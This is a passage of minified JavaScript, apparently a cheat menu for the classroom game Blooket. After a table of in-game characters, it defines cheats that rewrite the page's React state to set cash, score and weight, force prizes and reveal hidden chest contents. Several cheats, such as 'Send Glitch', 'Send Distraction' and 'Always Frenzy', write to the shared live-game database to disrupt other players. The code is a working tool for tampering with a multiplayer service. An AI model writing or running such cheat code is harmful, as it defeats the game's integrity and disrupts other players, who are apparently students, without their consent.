                            color: "#00aeef",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [3, 8, 85, 850, 8500],
                            time: [1, 1, 1, 1, 1],
                            price: [480, 5400, 62e3, 63e4]
                        }, {
                            name: "Parrot",
                            color: "#ed1c24",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [3, 9, 90, 900, 9e3],
                            time: [1, 1, 1, 1, 1],
                            price: [540, 5700, 65e3, 69e4]
                        }, {
                            name: "Panther",
                            color: "#2f2c38",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [12, 28, 215, 2100, 21e3],
                            time: [5, 3, 2, 2, 2],
                            price: [530, 6500, 76e3, 87e4]
                        }, {
                            name: "Anaconda",
                            color: "#8a9143",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [3, 15, 85, 1500, 7600],
                            time: [1, 2, 1, 2, 1],
                            price: [410, 5100, 58e3, 59e4]
                        }, {
                            name: "Orangutan",
                            color: "#bc6234",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [13, 52, 570, 4300, 7e4],
                            time: [5, 5, 5, 4, 4],
                            price: [600, 7e3, 8e4, 14e5]
                        }, {
                            name: "Capuchin",
                            color: "#e0b0a6",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [4, 14, 160, 780, 8200],
                            time: [2, 2, 2, 1, 1],
                            price: [390, 4700, 57e3, 68e4]
                        }, {
                            name: "Elf",
                            color: "#a7d054",
                            class: "⚔️",
                            rarity: "Uncommon",
                            cash: [5e3, 15e3, 15e4, 15e5, 1e7],
                            time: [1, 1, 1, 1, 1],
                            price: [8e5, 9e6, 11e7, 8e8]
                        }, {
                            name: "Witch",
                            color: "#4ab96d",
                            class: "⚔️",
                            rarity: "Uncommon",
                            cash: [18e3, 6e4, 4e4, 4e6, 35e6],
                            time: [3, 3, 2, 2, 2],
                            price: [11e5, 12e6, 15e7, 14e8]
                        }, {
                            name: "Wizard",
                            color: "#5a459c",
                            class: "⚔️",
                            rarity: "Uncommon",
                            cash: [19500, 65e3, 44e4, 46e5, 4e6],
                            time: [3, 3, 2, 2, 2],
                            price: [13e5, 135e5, 16e7, 16e8]
                        }, {
                            name: "Fairy",
                            color: "#df6d9c",
                            class: "⚔️",
                            rarity: "Uncommon",
                            cash: [18500, 6e4, 62e4, 44e5, 38e6],
                            time: [3, 3, 3, 2, 2],
                            price: [12e5, 125e5, 15e6, 15e8]
                        }, {
                            name: "Slime Monster",
                            color: "#2fa04a",
                            class: "⚔️",
                            rarity: "Uncommon",
                            cash: [35e3, 14e4, 1e6, 11e6, 11e7],
                            time: [5, 5, 4, 4, 4],
                            price: [16e5, 15e6, 2e8, 23e8]
                        }, {
                            name: "Jester",
                            color: "#be1e2d",
                            class: "⚔️",
                            rarity: "Rare",
                            cash: [25e3, 1e5, 68e4, 65e5, 32e6],
                            time: [3, 3, 2, 2, 1],
                            price: [2e6, 21e6, 23e7, 26e8]
                        }, {
                            name: "Dragon",
                            color: "#2fa04a",
                            class: "⚔️",
                            rarity: "Rare",
                            cash: [36e3, 15e4, 15e5, 15e6, 15e7],
                            time: [4, 4, 4, 4, 4],
                            price: [23e5, 24e6, 27e7, 3e9]
                        }, {
                            name: "Unicorn",
                            color: "#f6afce",
                            class: "⚔️",
                            rarity: "Epic",
                            cash: [24e3, 15e4, 14e5, 7e6, 75e6],
                            time: [2, 2, 2, 1, 1],
                            price: [45e5, 45e6, 55e7, 65e8]
                        }, {
                            name: "Queen",
                            color: "#9e1f63",
                            class: "⚔️",
                            rarity: "Rare",
                            cash: [24e3, 95e3, 95e4, 97e5, 95e6],
                            time: [3, 3, 3, 3, 3],
                            price: [19e5, 2e7, 23e7, 25e8]
                        }, {
                            name: "King",
                            color: "#ee2640",
                            class: "⚔️",
                            rarity: "Legendary",
                            cash: [75e3, 4e5, 6e6, 9e7, 125e7],
                            time: [5, 5, 5, 5, 5],
                            price: [6e6, 95e6, 16e8, 25e9]
                        }, {
                            name: "Two of Spades",
                            color: "#414042",
                            class: "\uD83C\uDFF0",
                            rarity: "Uncommon",
                            cash: [4500, 14e3, 14e4, 14e5, 9e6],
                            time: [1, 1, 1, 1, 1],
                            price: [77e4, 83e5, 98e6, 71e7]
                        }, {
                            name: "Eat Me",
                            color: "#d58c55",
                            class: "\uD83C\uDFF0",
                            rarity: "Uncommon",
                            cash: [13e3, 45e3, 45e4, 45e5, 5e7],
                            time: [2, 2, 2, 2, 2],
                            price: [13e5, 14e6, 16e7, 2e9]
                        }, {
                            name: "Drink Me",
                            color: "#dd7399",
                            class: "\uD83C\uDFF0",
                            rarity: "Uncommon",
                            cash: [12e3, 4e4, 4e5, 4e6, 45e6],
                            time: [2, 2, 2, 2, 2],
                            price: [12e5, 12e6, 14e7, 18e8]
                        }, {
                            name: "Alice",
                            color: "#4cc9f5",
                            class: "\uD83C\uDFF0",
                            rarity: "Uncommon",
                            cash: [13e3, 42e3, 21e4, 21e5, 23e6],
                            time: [2, 2, 1, 1, 1],
                            price: [12e5, 13e6, 15e7, 19e8]
                        }, {
                            name: "Queen of Hearts",
                            color: "#d62027",
                            class: "\uD83C\uDFF0",
                            rarity: "Uncommon",
                            cash: [23e3, 87e3, 62e4, 75e5, 9e7],
                            time: [4, 4, 3, 3, 3],
                            price: [13e5, 13e6, 18e7, 24e8]
                        }, {
                            name: "Dormouse",
                            color: "#89d6f8",
                            class: "\uD83C\uDFF0",
                            rarity: "Rare",
                            cash: [17e3, 68e3, 7e5, 35e5, 35e6],
                            time: [2, 2, 1, 1, 1],
                            price: [2e6, 22e6, 25e7, 28e8]
                        }, {
                            name: "White Rabbit",
                            color: "#ffcd05",
                            class: "\uD83C\uDFF0",
                            rarity: "Rare",
                            cash: [26e3, 105e3, 11e6, 77e5, 72e6],
                            time: [3, 3, 3, 2, 2],
                            price: [2e6, 23e6, 28e7, 29e8]
                        }, {
                            name: "Cheshire Cat",
                            color: "#dd7399",
                            class: "\uD83C\uDFF0",
                            rarity: "Rare",
                            cash: [32e3, 1e5, 9e5, 9e6, 6e7],
                            time: [4, 3, 3, 3, 2],
                            price: [18e5, 19e6, 22e7, 24e8]
                        }, {
                            name: "Caterpillar",
                            color: "#00c0f3",
                            class: "\uD83C\uDFF0",
                            rarity: "Epic",
                            cash: [1e4, 7e4, 65e4, 75e5, 85e6],
                            time: [1, 1, 1, 1, 1],
                            price: [42e5, 42e6, 54e7, 69e8]
                        }, {
                            name: "Mad Hatter",
                            color: "#914f93",
                            class: "\uD83C\uDFF0",
                            rarity: "Epic",
                            cash: [38e3, 25e4, 15e5, 14e6, 8e7],
                            time: [3, 3, 2, 2, 1],
                            price: [48e5, 48e6, 52e7, 66e8]
                        }, {
                            name: "King of Hearts",
                            color: "#c62127",
                            class: "\uD83C\uDFF0",
                            rarity: "Legendary",
                            cash: [8e4, 42e4, 68e5, 1e8, 15e8],
                            time: [5, 5, 5, 5, 5],
                            price: [7e6, 11e7, 18e8, 3e10]
                        }, {
                            name: "Earth",
                            color: "#416eb5",
                            class: "\uD83D\uDE80",
                            rarity: "Uncommon",
                            cash: [15e3, 45e3, 6e5, 65e5, 65e6],
                            time: [3, 3, 3, 3, 3],
                            price: [1e6, 11e6, 15e7, 17e8]
                        }, {
                            name: "Meteor",
                            color: "#c68c3c",
                            class: "\uD83D\uDE80",
                            rarity: "Uncommon",
                            cash: [23e3, 65e3, 7e5, 45e5, 2e7],
                            time: [5, 4, 3, 2, 1],
                            price: [95e4, 13e6, 16e7, 16e8]
                        }, {
                            name: "Stars",
                            color: "#19184d",
                            class: "\uD83D\uDE80",
                            rarity: "Uncommon",
                            cash: [1e4, 4e4, 2e5, 2e6, 18e6],
                            time: [2, 2, 1, 1, 1],
                            price: [14e5, 14e6, 15e7, 15e8]
                        }, {
                            name: "Alien",
                            color: "#8dc63f",
                            class: "\uD83D\uDE80",
                            rarity: "Uncommon",
                            cash: [3e4, 1e5, 1e6, 11e6, 85e6],
                            time: [4, 4, 4, 4, 4],
                            price: [15e5, 17e6, 19e7, 17e8]
                        }, {
                            name: "Planet",
                            color: "#9dc6ea",
                            class: "\uD83D\uDE80",
                            rarity: "Rare",
                            cash: [25e3, 1e5, 9e5, 9e6, 9e7],
                            time: [3, 3, 3, 3, 3],
                            price: [2e6, 21e6, 21e7, 24e8]
                        }, {
                            name: "UFO",
                            color: "#a15095",
                            class: "\uD83D\uDE80",
                            rarity: "Rare",
                            cash: [17e3, 7e4, 7e5, 7e6, 7e7],
                            time: [2, 2, 2, 2, 2],
                            price: [21e5, 23e6, 25e7, 28e8]
                        }, {
                            name: "Spaceship",
                            color: "#ffcb29",
                            class: "\uD83D\uDE80",
                            rarity: "Epic",
                            cash: [6e4, 32e4, 21e5, 15e6, 85e6],
                            time: [5, 4, 3, 2, 1],
                            price: [48e5, 46e6, 54e7, 68e8]
                        }, {
                            name: "Astronaut",
                            color: "#9bd4ee",
                            class: "\uD83D\uDE80",
                            rarity: "Legendary",
                            cash: [45e3, 26e4, 25e5, 38e6, 55e7],
                            time: [3, 3, 2, 2, 2],
                            price: [65e5, 1e8, 17e8, 27e9]
                        }, {
                            name: "Lil Bot",
                            color: "#3e564a",
                            class: "\uD83E\uDD16",
                            rarity: "Uncommon",
                            cash: [4e3, 12e3, 18e4, 19e5, 25e6],
                            time: [1, 1, 1, 1, 1],
                            price: [73e4, 12e6, 13e7, 19e8]
                        }, {
                            name: "Lovely Bot",
                            color: "#f179af",
                            class: "\uD83E\uDD16",
                            rarity: "Uncommon",
                            cash: [16e3, 65e3, 65e4, 48e5, 42e6],
                            time: [3, 3, 3, 2, 2],
                            price: [13e5, 14e6, 17e7, 16e8]
                        }, {
                            name: "Angry Bot",
                            color: "#f1613a",
                            class: "\uD83E\uDD16",
                            rarity: "Uncommon",
                            cash: [22e3, 85e3, 8e5, 62e5, 65e6],
                            time: [4, 4, 4, 3, 3],
                            price: [12e5, 13e6, 15e7, 17e8]
                        }, {
                            name: "Happy Bot",
                            color: "#51ba6b",
                            class: "\uD83E\uDD16",
                            rarity: "Uncommon",
                            cash: [11e3, 45e3, 5e5, 25e5, 3e7],
                            time: [2, 2, 2, 1, 1],
                            price: [14e5, 15e6, 18e7, 24e8]
                        }, {
                            name: "Watson",
                            color: "#d69b5a",
                            class: "\uD83E\uDD16",
                            rarity: "Rare",
                            cash: [24e3, 1e5, 1e6, 1e7, 1e8],
                            time: [3, 3, 3, 3, 3],
                            price: [2e6, 22e6, 24e7, 26e8]
                        }, {
                            name: "Buddy Bot",
                            color: "#9dc6ea",
                            class: "\uD83E\uDD16",
                            rarity: "Rare",
                            cash: [22e3, 95e3, 65e4, 65e5, 65e6],
                            time: [3, 3, 2, 2, 2],
                            price: [19e5, 21e6, 23e7, 25e8]
                        }, {
                            name: "Brainy Bot",
                            color: "#9ecf7a",
                            class: "\uD83E\uDD16",
                            rarity: "Epic",
                            cash: [5e4, 25e4, 21e5, 21e6, 17e7],
                            time: [4, 3, 3, 3, 2],
                            price: [5e6, 46e6, 5e8, 67e8]
                        }, {
                            name: "Mega Bot",
                            color: "#d71f27",
                            class: "\uD83E\uDD16",
                            rarity: "Legendary",
                            cash: [8e4, 43e4, 42e5, 62e6, 1e9],
                            time: [5, 5, 3, 3, 3],
                            price: [7e6, 12e7, 19e8, 35e9]
                        }].find(function({
                            name: e
                        }) {
                            return e.toLowerCase() == this
                        }, prompt("Enter blook name:").toLowerCase());
                        o ? (t.state.blooks.length >= 10 && alert("Choose a blook to replace"), t.chooseBlook(o)) : alert("That is not a valid blook!")
                    }
                }, {
                    name: "Free Upgrades",
                    description: "Sets upgrade prices to 0 for all current blooks",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState(e => ({
                            ...e,
                            blooks: e.blooks.map(e => ({
                                ...e,
                                price: [0, 0, 0, 0]
                            }))
                        }))
                    }
                }, {
                    name: "Max Blooks",
                    description: "Maxes out all your blooks' levels",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.state.blooks.forEach(e => e.level = 4)
                    }
                }, {
                    name: "Remove Glitches",
                    description: "Removes all enemy glitches",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.setState({
                            bits: 0,
                            ads: [],
                            hazards: [],
                            color: "",
                            lol: !1,
                            joke: !1,
                            slow: !1,
                            dance: !1,
                            glitch: "",
                            glitcherName: "",
                            glitcherBlook: ""
                        }), clearTimeout(e.adTimeout), clearInterval(e.hazardInterval), clearTimeout(e.nightTimeout), clearTimeout(e.glitchTimeout), clearTimeout(e.lolTimeout), clearTimeout(e.jokeTimeout), clearTimeout(e.slowTimeout), clearTimeout(e.danceTimeout), clearTimeout(e.nameTimeout)
                    }
                }, {
                    name: "Send Glitch",
                    description: "Sends a glitch to everyone else playing",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner).stateNode,
                            t = {
                                lb: "Lunch Break",
                                as: "Ad Spam",
                                e37: "Error 37",
                                nt: "Night Time",
                                lo: "#LOL",
                                j: "Jokester",
                                sm: "Slow Mo",
                                dp: "Dance Party",
                                v: "Vortex",
                                r: "Reverse",
                                f: "Flip",
                                m: "Micro"
                            },
                            o = Object.keys(t)[Math.floor(Math.random() * Object.keys(t).length)];
                        e.safe = !0, e.props.liveGameController.setVal({
                            path: `c/${e.props.client.name}/tat`,
                            val: o
                        }), alert(`Sent a ${t[o]} glitch`)
                    }
                }, {
                    name: "Set All MegaBot",
                    description: "Sets all your blooks to maxed out Mega Bots",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            blooks: Array(10).fill({
                                name: "Mega Bot",
                                color: "#d71f27",
                                class: "\uD83E\uDD16",
                                rarity: "Legendary",
                                cash: [8e4, 43e4, 42e5, 62e6, 1e9],
                                time: [5, 5, 3, 3, 3],
                                price: [7e6, 12e7, 19e8, 35e9],
                                active: !1,
                                level: 4,
                                bonus: 5.5
                            })
                        })
                    }
                }, {
                    name: "Set Cash",
                    description: "Sets amount of cash you have",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How much cash would you like?"))));
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            cash: e
                        })
                    }
                }],
                fishing: [{
                    name: "Frenzy",
                    description: "Sets everyone to frenzy mode",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.props.liveGameController.setVal({
                            path: "c/" + e.props.client.name,
                            val: {
                                b: e.props.client.blook,
                                w: e.state.weight,
                                f: "Frenzy",
                                s: !0
                            }
                        })
                    }
                }, {
                    name: "Always Frenzy",
                    description: "Always sets everyone to frenzy mode",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;
                            this.data = setInterval(() => {
                                const cheat = (async () => {
                                    let {
                                        stateNode
                                    } = Object.values((function react(r = document.querySelector("body>div")) {
                                        return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                    })())[1].children[0]._owner;
                                    stateNode.props.liveGameController.setVal({
                                        path: `c/${stateNode.props.client.name}`,
                                        val: {
                                            b: stateNode.props.client.blook,
                                            w: stateNode.state.weight,
                                            f: "Frenzy",
                                            s: true
                                        }
                                    });
                                });
                                cheat();
                            }, 50);
                        }
                    }
                }, {
                    name: "Remove Distractions",
                    description: "Removes distractions",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                                party: ""
                            })
                        }, 50))
                    }
                }, {
                    name: "Send Distraction",
                    description: "Sends a distraction to everyone",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner).stateNode,
                            t = ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"][Math.floor(9 * Math.random())];
                        e.safe = !0, e.props.liveGameController.setVal({
                            path: "c/" + e.props.client.name,
                            val: {
                                b: e.props.client.blook,
                                w: e.state.weight,
                                f: t,
                                s: !0
                            }
                        }), alert(`Sent a ${t} distraction`)
                    }
                }, {
                    name: "Set Lure",
                    description: "Sets fishing lure (range 1 - 5)",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            lure: Math.max(Math.min(Number(parseInt(prompt("What would you like to set your lure to? (1 - 5)"))) - 1, 4), 0)
                        })
                    }
                }, {
                    name: "Set Next Fish",
                    description: "Sets the next fish to catch",
                    run: function() {
                        var e = document.createElement("iframe");

                        function t() {
                            return Object.values(document.querySelector("#app > div > div"))[1].children[0]._owner
                        }
                        document.body.appendChild(e), window.prompt = e.contentWindow.prompt.bind(window), window.alert = e.contentWindow.alert.bind(window), e.remove();
                        var o = {
                                "Old Boot": {
                                    rarity: "Trash",
                                    minWeight: 1,
                                    maxWeight: 10,
                                    tiers: ["F", "D", "C"]
                                },
                                Waffle: {
                                    rarity: "Trash",
                                    minWeight: 1,
                                    maxWeight: 10,
                                    tiers: ["F", "D", "C"]
                                },
                                "Two of Spades": {
                                    rarity: "Trash",
                                    minWeight: 1,
                                    maxWeight: 10,
                                    tiers: ["F", "D", "C"]
                                },
                                Jellyfish: {
                                    rarity: "Easy One",
                                    minWeight: 10,
                                    maxWeight: 25,
                                    tiers: ["D", "C", "B"]
                                },
                                Clownfish: {
                                    rarity: "Easy One",
                                    minWeight: 20,
                                    maxWeight: 45,
                                    tiers: ["D", "C", "B"]
                                },
                                Goldfish: {
                                    rarity: "Easy One",
                                    minWeight: 30,
                                    maxWeight: 65,
                                    tiers: ["D", "C", "B"]
                                },
                                Frog: {
                                    rarity: "Easy One",
                                    minWeight: 50,
                                    maxWeight: 100,
                                    tiers: ["D", "C", "B"]
                                },
                                "Blizzard Clownfish": {
                                    rarity: "Great Catch",
                                    minWeight: 75,
                                    maxWeight: 125,
                                    tiers: ["D", "C", "B"]
                                },
                                Turtle: {
                                    rarity: "Great Catch",
                                    minWeight: 100,
                                    maxWeight: 150,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Cat: {
                                    rarity: "Great Catch",
                                    minWeight: 100,
                                    maxWeight: 200,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                "Lovely Frog": {
                                    rarity: "Great Catch",
                                    minWeight: 150,
                                    maxWeight: 350,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                "Lucky Frog": {
                                    rarity: "Great Catch",
                                    minWeight: 200,
                                    maxWeight: 400,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                "Poison Dart Frog": {
                                    rarity: "Great Catch",
                                    minWeight: 250,
                                    maxWeight: 750,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Seal: {
                                    rarity: "Rare Find",
                                    minWeight: 500,
                                    maxWeight: 1e3,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Walrus: {
                                    rarity: "Rare Find",
                                    minWeight: 700,
                                    maxWeight: 2200,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Fairy: {
                                    rarity: "Rare Find",
                                    minWeight: 1500,
                                    maxWeight: 2500,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Crab: {
                                    rarity: "Rare Find",
                                    minWeight: 1e3,
                                    maxWeight: 3e3,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                "Lemon Crab": {
                                    rarity: "Rare Find",
                                    minWeight: 2e3,
                                    maxWeight: 5e3,
                                    tiers: ["C", "B", "A"]
                                },
                                Pufferfish: {
                                    rarity: "Rare Find",
                                    minWeight: 2e3,
                                    maxWeight: 4e3,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                Blobfish: {
                                    rarity: "Rare Find",
                                    minWeight: 3e3,
                                    maxWeight: 5e3,
                                    tiers: ["D", "C", "B", "A"]
                                },
                                "Rainbow Jellyfish": {
                                    rarity: "Epic Grab",
                                    minWeight: 7e3,
                                    maxWeight: 1e4,
                                    tiers: ["C", "B", "A"]
                                },
                                Octopus: {
                                    rarity: "Epic Grab",
                                    minWeight: 1e4,
                                    maxWeight: 15e3,
                                    tiers: ["C", "B", "A"]
                                },
                                "Pirate Pufferfish": {
                                    rarity: "Epic Grab",
                                    minWeight: 12e3,
                                    maxWeight: 2e4,
                                    tiers: ["C", "B", "A"]
                                },
                                "Donut Blobfish": {
                                    rarity: "Epic Grab",
                                    minWeight: 13e3,
                                    maxWeight: 25e3,
                                    tiers: ["C", "B", "A"]
                                },
                                "Crimson Octopus": {
                                    rarity: "Epic Grab",
                                    minWeight: 15e3,
                                    maxWeight: 3e4,
                                    tiers: ["B", "A"]
                                },
                                Narwhal: {
                                    rarity: "Catch of the Day",
                                    minWeight: 25e3,
                                    maxWeight: 5e4,
                                    tiers: ["B", "A", "S"]
                                },
                                "Baby Shark": {
                                    rarity: "Catch of the Day",
                                    minWeight: 5e4,
                                    maxWeight: 1e5,
                                    tiers: ["B", "A", "S"]
                                },
                                Megalodon: {
                                    rarity: "Catch of the Day",
                                    minWeight: 25e4,
                                    maxWeight: 5e5,
                                    tiers: ["B", "A", "S"]
                                },
                                Alien: {
                                    rarity: "Angler's Legend",
                                    minWeight: 5e5,
                                    maxWeight: 7e5,
                                    tiers: ["A", "S"]
                                },
                                "Rainbow Narwhal": {
                                    rarity: "Angler's Legend",
                                    minWeight: 75e4,
                                    maxWeight: 1e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                UFO: {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                "Santa Claus": {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                "Swamp Monster": {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                "Red Astronaut": {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                "Spooky Pumpkin": {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                Dragon: {
                                    rarity: "Angler's Legend",
                                    minWeight: 1e6,
                                    maxWeight: 2e6,
                                    tiers: ["A", "S", "S+"]
                                },
                                "Tim the Alien": {
                                    rarity: "Angler's Legend",
                                    minWeight: 15e5,
                                    maxWeight: 25e5,
                                    tiers: ["A", "S", "S+"]
                                }
                            },
                            a = ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"];
                        if (!window.functionSet) {
                            var r = t().stateNode.answerNext;
                            t().stateNode.answerNext = function() {
                                if (t().stateNode.state.hackFish) {
                                    var e, n, i;
                                    t().stateNode.setState({
                                        stage: "caught",
                                        isCast: !1,
                                        fish: {
                                            name: e = t().stateNode.state.hackFish,
                                            rarity: o[e].rarity,
                                            weight: (n = o[e].minWeight, Math.floor(Math.random() * ((i = o[e].maxWeight) - n) + n)),
                                            tier: o[e].tiers[Math.floor(Math.random() * o[e].tiers.length)],
                                            isSpecial: a.includes(e) && 8 > Math.floor(100 * Math.random())
                                        },
                                        claimReady: !1
                                    }), setTimeout(function() {
                                        t().stateNode.setState({
                                            claimReady: !0
                                        })
                                    }, 1600), t().stateNode.state.hackFish = null
                                } else r.apply(this, arguments)
                            }
                        }
                        window.functionSet = !0,
                            function e(a) {
                                if (Object.keys(o).includes(a)) t().stateNode.state.hackFish = a;
                                else {
                                    alert("That fish does not exist!");
                                    return
                                }
                            }(prompt("What fish would you like to catch next (case sensitive)?"))
                    }
                }, {
                    name: "Set Weight",
                    description: "Sets weight",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How much weight would you like?")))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            weight: e,
                            weight2: e
                        }), t.props.liveGameController.setVal({
                            path: "c/" + t.props.client.name,
                            val: {
                                b: t.props.client.blook,
                                w: e,
                                f: ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"][Math.floor(9 * Math.random())]
                            }
                        })
                    }
                }],
                flappy: [{
                    name: "Toggle Ghost",
                    description: "Lets you go through the pipes",
                    type: "toggle",
                    enabled: false,
                    run: function() {
                        this.enabled = !this.enabled;
                        for (const body of Object.values(document.querySelector("#phaser-bouncy"))[0].return.updateQueue.lastEffect.deps[0].current.config.sceneConfig.physics.world.bodies.entries) {
                            if (!body.gameObject.frame.texture.key.startsWith("blook")) continue;
                            body.checkCollision.none = this.enabled;
                            body.gameObject.setAlpha(this.enabled ? 0.5 : 1);
                            break;
                        };
                    }
                }, {
                    name: "Set Score",
                    description: "Sets flappy blook score",
                    run: function() {
                        Object.values(document.querySelector("#phaser-bouncy"))[0].return.updateQueue.lastEffect.deps[1](parseInt(prompt("What do you want to set your score to?")) || 0);
                    }
                }],
                gold: [{
                    name: "Always Triple",
                    description: "Always get triple gold",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        let e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e._choosePrize ||= e.choosePrize, this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null, e.choosePrize = e._choosePrize || e.choosePrize) : (this.enabled = !0, this.data = setInterval(() => {
                            e.choosePrize = function(t) {
                                e.state.choices[t] = {
                                    type: "multiply",
                                    val: 3,
                                    text: "Triple Gold!",
                                    blook: "Unicorn"
                                }, e._choosePrize(t)
                            }
                        }, 50))
                    }
                }, {
                    name: "Auto Choose",
                    description: "Automatically picks the option that would give you the most gold",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;
                            this.data = setInterval(() => {
                                let {
                                    stateNode
                                } = Object.values((function react(r = document.querySelector("body>div")) {
                                    return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                })())[1].children[0]._owner;

                                if (stateNode.state.stage == "prize") {
                                    stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
                                        if (players == null) return;
                                        players = Object.entries(players);
                                        let most = 0,
                                            max = 0,
                                            index = -1;
                                        for (let i = 0; i < players.length; i++) {
                                            if (players[i][0] != stateNode.props.client.name && players[i][1] > most) {
                                                most = players[i][1];
                                            }
                                        }
                                        for (let i = 0; i < stateNode.state.choices.length; i++) {
                                            const choice = stateNode.state.choices[i];
                                            let value = stateNode.state.gold;
                                            if (choice.type == "gold") {
                                                value = stateNode.state.gold + (choice.val || 0);
                                            } else if (choice.type == "multiply" || choice.type == "divide") {
                                                value = Math.round(stateNode.state.gold * choice.val) || stateNode.state.gold;
                                            } else if (choice.type == "swap") {
                                                value = most || stateNode.state.gold;
                                            } else if (choice.type == "take") {
                                                value = stateNode.state.gold + (most * choice.val || 0);
                                            }
                                            if ((value || 0) <= max) continue;
                                            max = value;
                                            index = i + 1;
                                        }
                                        document.querySelector("div[class*='choice" + index + "']")?.click();
                                    });
                                }
                            }, 50);
                        }
                    }
                }, {
                    name: "Chest ESP",
                    description: "Shows what each chest will give you",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;
                            this.data = setInterval(() => {
                                const cheat = (async () => {
                                    Object.values((function react(r = document.querySelector("body>div")) {
                                        return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                    })())[1].children[0]._owner.stateNode.state.choices.forEach(({
                                        text
                                    }, index) => {
                                        let chest = document.querySelector(`div[class*='choice${index + 1}']`);
                                        if (!chest || chest.querySelector('div')) return;
                                        let choice = document.createElement('div')
                                        choice.style.color = "white";
                                        choice.style.fontFamily = "Eczar";
                                        choice.style.fontSize = "2em";
                                        choice.style.display = "flex";
                                        choice.style.justifyContent = "center";
                                        choice.style.transform = "translateY(200px)";
                                        choice.innerText = text;
                                        chest.append(choice)
                                    });
                                });
                                cheat();
                            }, 50);
                        }
                    }
                }, {
                    name: "Remove Lose 25%-50%",
                    description: "Blocks buttons with text 'Lose 25%' and 'Lose 50%'",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        let e = this,
                            t = this;

                        function o() {
                            return Object.values(document.querySelector("#app > div > div"))[1].children[1]._owner
                        }
